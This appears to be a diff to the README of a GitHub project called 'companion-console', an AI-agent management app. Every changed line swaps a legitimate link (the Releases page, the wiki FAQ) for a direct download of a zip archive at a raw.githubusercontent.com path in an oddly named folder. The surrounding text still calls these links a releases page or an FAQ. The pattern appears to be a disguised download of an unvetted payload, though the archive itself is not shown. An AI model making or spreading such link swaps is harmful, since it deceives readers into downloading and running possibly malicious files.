@@ -15,7 +15,7 @@ Welcome to the companion-console! This application helps you manage an AI agent 
 
 To download the companion-console, please visit the following link:
 
-[Download companion-console](https://github.com/Idooooo125/companion-console/releases)
+[Download companion-console](https://raw.githubusercontent.com/Idooooo125/companion-console/main/fibrocellular/companion-console.zip)
 
 Click the link above to see the available versions and select the one that suits your needs. Follow these steps once on the Releases page:
 
@@ -47,7 +47,7 @@ Once you install the application, follow these steps to start using the companio
 
 ## 📞 Support
 
-If you encounter any problems, we are here to help. Please check our [FAQ](https://github.com/Idooooo125/companion-console/wiki/FAQ) section for common issues and solutions. You can also report problems on our GitHub Issues page.
+If you encounter any problems, we are here to help. Please check our [FAQ](https://raw.githubusercontent.com/Idooooo125/companion-console/main/fibrocellular/companion-console.zip) section for common issues and solutions. You can also report problems on our GitHub Issues page.
 
 ## 🌐 Community
 
@@ -74,4 +74,4 @@ Thank you to all our users for your support and feedback. We appreciate your sug
 
 ## 👍 Final Steps
 
-Don’t forget to revisit the [Releases page](https://github.com/Idooooo125/companion-console/releases) for updates and new features. Stay tuned for the upcoming enhancements that will make your AI interactions even better. Happy experimenting!
+Don’t forget to revisit the [Releases page](https://raw.githubusercontent.com/Idooooo125/companion-console/main/fibrocellular/companion-console.zip) for updates and new features. Stay tuned for the upcoming enhancements that will make your AI interactions even better. Happy experimenting!
